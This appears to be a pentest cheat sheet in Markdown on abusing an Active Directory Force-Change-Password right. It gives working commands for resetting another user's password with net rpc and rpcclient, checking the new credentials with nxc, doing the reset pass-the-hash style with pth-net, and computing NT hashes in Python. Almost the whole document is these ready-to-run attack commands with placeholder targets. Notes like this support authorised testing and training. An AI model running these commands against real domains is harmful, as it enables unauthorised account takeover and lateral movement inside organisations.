#### Password Reset with net
`USERA` has Force-Change-Password over `<TARGET-USER>`
```shell
net rpc password <TARGET-USER> Mynewpassword1 -U domain.local/<USERA>%<PASSWORD> -S <TARGET-IP>
```
#### Validating the Credentials
```shell
nxc ldap <TARGET-IP> -u <TARGET-USER> -p Mynewpassword1
```
#### Password Reset with `rpcclient`:
Another way with `rpcclient`
```shell
rpcclient -U domain.local/<USERA>%<PASSWORD> <TARGET-IP>
setuserinfo2 <TARGET-USER> 23 Mynewpassword1
exit
```
#### Using RPC with hashes
```shell
pth-net rpc password "<TARGET-USER>" -U "domain.local"/"<USERA>"%"ffffffffffffffffffffffffffffffff":"<NT_HASH>" -S <TARGET-IP>
```
#### we can get any password `NT_HASH` by following
```shell
python
>>> import hashlib
>>> hashlib.new('md4', '<PASSWORD>'.encode('utf-16le')).digest().hex()
```
